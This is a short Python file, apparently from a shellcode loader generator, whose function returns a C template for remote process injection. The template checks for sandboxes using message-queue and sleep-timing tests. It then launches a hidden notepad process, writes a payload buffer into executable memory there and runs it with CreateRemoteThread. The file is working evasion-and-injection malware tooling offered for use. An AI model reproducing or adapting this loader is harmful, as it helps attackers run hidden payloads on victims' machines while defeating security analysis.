###"Technical principle: https://idiotc4t.com/code-and-dll-process-injection/createremotethread"
def get():
    c_code = '''
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
<TABLES>

int main()
{

    MSG msg;
    DWORD tc;
    PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
    if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
                return 0;

    if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
    return 0;
    tc = GetTickCount();
    Sleep(650);

    if (((GetTickCount() - tc) / 300) != 2)
        return 0;

    STARTUPINFO si = { 0 };
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESHOWWINDOW;
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFO);

    CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
    LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, 0, sizeof(offset_table), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, lpBaseAddress, lpBuffer, sizeof(offset_table), NULL);
    CreateRemoteThread(pi.hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0);
    return 0;
}
'''
    return c_code

